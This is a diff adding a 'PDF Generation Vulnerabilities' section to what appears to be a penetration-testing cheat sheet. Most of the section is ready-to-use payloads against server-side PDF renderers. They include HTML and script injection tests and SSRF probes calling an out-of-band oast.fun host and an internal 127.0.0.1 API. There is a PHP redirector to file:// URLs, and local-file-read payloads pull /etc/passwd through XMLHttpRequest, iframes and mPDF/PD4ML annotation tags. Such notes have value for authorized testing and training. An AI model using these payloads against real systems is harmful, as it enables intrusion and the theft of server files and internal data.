@@ -183,3 +183,72 @@ Try or and
 ## PDF Generation Vulnerabilities
 
 - `exiftool invoice.pdf` - use exiftool to gain information about the library used to generate the PDF after downloading from the target
+- If we can post to an site and the generate a PDF we can check if the server executes what we post during generation.
+```html
+<b>test1</b> <!-- entered into the title field -->
+<b>test2</b> <!-- entered into the comment field-->
+```
+- If one of the tests comes back bold, we know that field is possibly vulnerable
+
+### XSS
+
+- Next we can test if JS is executed
+```html
+<script>document.write('test1')</script>
+```
+- Show where generated PDFs are stored with
+```html
+<script>document.write(window.location)</script>
+```
+
+### SSRF
+
+- Test for SSRF by sending requests to a server we control with one of the following
+```html
+<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
+<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
+<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
+```
+- If the generated PDF displays the HTTP response from our server we have a regular SSRF vulnerability and we can extract data by making calls to internal API's
+```html
+<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
+```
+- If the PDF does not display the response we can test if it does after redirct
+- Run the following PHP script on the server
+```php
+<?php header('Location: file://' . $_GET['url']); ?>
+```
+- Then send the following request (this really comes under LFI)
+```html
+<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
+```
+
+### Local File Inclusion
+
+- Test for LFI with base64 encoding to avoid errors
+```html
+<script>
+    x = new XMLHttpRequest();
+    x.onload = function(){
+        document.write(btoa(this.responseText))
+    };
+    x.open("GET", "file:///etc/passwd");
+    x.send();
+</script>
+```
+- We can still test for LFI if the JS is not executed purely with HTML tags
+```html
+<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
+<object data="file:///etc/passwd" width="800" height="500">
+<portal src="file:///etc/passwd" width="800" height="500">
+```
+
+#### Annotations
+
+- Some PDF generation libraries (mPDF pre version 6.0, PD4ML) support annotations or attachments
+- The following will append the LFI to the PDF
+```html
+<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
+<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
+```
+
